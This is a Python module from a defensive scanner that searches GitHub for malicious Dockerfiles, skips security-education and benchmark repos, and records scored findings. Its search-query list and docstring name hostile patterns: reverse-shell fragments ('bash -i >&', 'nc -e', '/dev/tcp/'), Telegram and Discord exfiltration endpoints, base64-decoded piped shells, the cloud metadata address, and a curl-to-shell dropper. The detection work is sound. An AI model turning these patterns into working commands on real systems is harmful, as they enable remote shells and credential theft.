"""Dockerfile-in-git scanner: find malicious Dockerfile CODE across GitHub.

The pre-publish supply-chain surface (PRD 7.3). A Dockerfile that embeds a
reverse shell, a C2 beacon, a credential/metadata stealer, an obfuscated loader,
or a ``RUN curl http://<attacker> | sh`` dropper is a finding in its own right --
and the class of threat that a cryptominer-keyword registry search never surfaces.

Reuses the full-spectrum signature library + precision gate over the Dockerfile
text. A defensive filter skips security-education / pentest / CTF / malware-sample
repos, which legitimately contain these patterns and would otherwise dominate the
results. Confirmation is still precision-first: a healthcheck ``/dev/tcp`` write
or a ``curl https://get.docker.com | sh`` never confirm.
"""

from __future__ import annotations

import logging
import re
import time
from dataclasses import dataclass, field

from .config_scan import scan_texts, score_signals
from .gate import confirm

log = logging.getLogger(__name__)

# High-signal malicious-Dockerfile patterns (deliberately NON-crypto: this source
# exists to find the threat classes the registry miner-search misses).
DOCKERFILE_QUERIES = (
    '"/dev/tcp/" filename:Dockerfile',
    '"bash -i >&" filename:Dockerfile',
    '"nc -e" filename:Dockerfile',
    '"api.telegram.org/bot" filename:Dockerfile',
    '"discord.com/api/webhooks" filename:Dockerfile',
    '"base64 -d" "| bash" filename:Dockerfile',
    '"| base64 -d | sh" filename:Dockerfile',
    '"/etc/ld.so.preload" filename:Dockerfile',
    '"169.254.169.254" filename:Dockerfile',
    '"curl" "| sh" "http://" filename:Dockerfile',
)

# Repos that legitimately carry attack strings: security education, tooling,
# CTF, malware samples. Skipped so the results are actual weaponized build files.
_DEFENSIVE = re.compile(
    r"(pentest|ctf|hack(ing|tool)?|payload|revshell|reverse.?shell|exploit|red.?team|"
    r"awesome|cheat.?sheet|write.?up|honeypot|malware|sample|\bpoc\b|cve-|seclists|"
    r"payloadsallthethings|security|infosec|oscp|htb|tryhackme|vuln|forensic|sandbox|"
    r"detection|falco|osquery|\byara\b|scanner|antivirus|training|course|lab|demo|example|"
    r"dataset|benchmark|corpus|smelly|canary|test.?case|fixtures?|"
    r"escalation|escape|boot.?2.?root|b00t.?2.?r00t|priv.?esc|kali|\bnotes?\b|\bdocs?\b|wiki|blog)",
    re.I)
# Content markers that identify AI-eval / benchmark data whose "attack" strings
# are dataset content, not weaponized code (the terminal-bench canary FP).
_BENCHMARK_CONTENT = re.compile(
    r"terminal-bench-canary|BENCHMARK DATA SHOULD NEVER APPEAR|canary GUID|"
    r"DO NOT (?:EDIT|REMOVE)[^\n]{0,40}(?:canary|benchmark)", re.I)


def is_defensive(repo_full: str, path: str = "") -> bool:
    return bool(_DEFENSIVE.search(repo_full) or _DEFENSIVE.search(path))


# The code search matches "Dockerfile" anywhere in the name, which also returns
# prose like "Dockerfile-Parser.md". Only scan files that ARE a build file.
_REAL_DOCKERFILE = re.compile(
    r"(^|/)(dockerfile|containerfile)([.\-][\w.\-]*)?$|\.dockerfile$", re.I)


def is_dockerfile(path: str) -> bool:
    base = path.rsplit("/", 1)[-1]
    if base.lower().endswith((".md", ".txt", ".rst", ".html", ".json", ".yaml", ".yml")):
        return False
    return bool(_REAL_DOCKERFILE.search(path))


@dataclass
class DockerfileHit:
    repo: str
    path: str
    url: str
    score: int = 0
    tier: str | None = None
    confirmed: bool = False
    signals: list[str] = field(default_factory=list)
    confirming: list[dict] = field(default_factory=list)


def scan_dockerfiles(client, queries=DOCKERFILE_QUERIES, *, per_query: int = 15,
                     pace: float = 7.0, known: set[str] | None = None,
                     progress=None) -> list[DockerfileHit]:
    """Search GitHub for malicious Dockerfiles, fetch, scan, and gate each."""
    seen = set(known or set())
    hits: list[DockerfileHit] = []
    for i, query in enumerate(queries):
        items = client.search_code(query, per_page=per_query)
        if progress:
            progress(f"  [{i+1}/{len(queries)}] {query!r} -> {len(items)} file(s)")
        for it in items:
            repo = it.get("repository", {}).get("full_name", "")
            path = it.get("path", "")
            key = f"{repo}:{path}".casefold()
            if not repo or key in seen:
                continue
            seen.add(key)
            if is_defensive(repo, path) or not is_dockerfile(path):
                continue
            text = client.get_content(repo, path)
            if not text or _BENCHMARK_CONTENT.search(text):
                continue  # unreadable, or an AI-eval/benchmark dataset (attack-as-data)
            # Scan per line so the confirming evidence is the actual matching line,
            # not the file header (better proof for review).
            sigs = scan_texts(text.splitlines())
            if not sigs:
                continue
            ok, tier, conf = confirm(sigs)
            hits.append(DockerfileHit(
                repo=repo, path=path, url=it.get("html_url", ""),
                score=score_signals(sigs), tier=tier, confirmed=ok,
                signals=sorted({f"{s.category}/{s.rule}" for s in sigs}),
                confirming=[{"category": c.category, "rule": c.rule, "evidence": c.evidence}
                            for c in conf] if ok else []))
        if i < len(queries) - 1:
            time.sleep(pace)
    return hits


def finding_from_hit(hit: DockerfileHit):
    """Map a DockerfileHit onto the same ImageFinding record the registry hunt
    uses, so malicious Dockerfile code shows up in the SAME registry (and
    dashboard, and `knorr watch` alerts) as malicious images, instead of only
    ever being printed to a console and forgotten. Keyed
    ``github.com/<owner>/<repo>:<path>`` (not a pullable OCI image; this
    artifact is a source file, not a container), with the GitHub blob URL
    stashed in evidence for the dashboard link. Shared by ``cli.py``'s
    ``knorr dockerfiles`` command and ``watch.py``'s periodic dockerfile round.
    """
    from ..models import DetectionMethod, FindingStatus, ImageFinding

    if hit.confirmed:
        status = FindingStatus.CONFIRMED
    elif hit.score >= 4:
        status = FindingStatus.SCREENED
    else:
        status = FindingStatus.CANDIDATE
    cats = sorted({s.split("/")[0] for s in hit.signals})
    return ImageFinding(
        image=f"github.com/{hit.repo}:{hit.path}".casefold(),
        reference=hit.path,
        detection_method=DetectionMethod.DOCKERFILE_SCAN,
        status=status,
        score=hit.score,
        signals=list(hit.signals),
        publisher=hit.repo.split("/", 1)[0].casefold(),
        tier=hit.tier,
        confirming=list(hit.confirming),
        reasoning=f"malicious Dockerfile code in {hit.repo}/{hit.path} "
                 f"(facets: {', '.join(cats) or '-'})",
        evidence={"dockerfile_url": hit.url, "path": hit.path},
    )
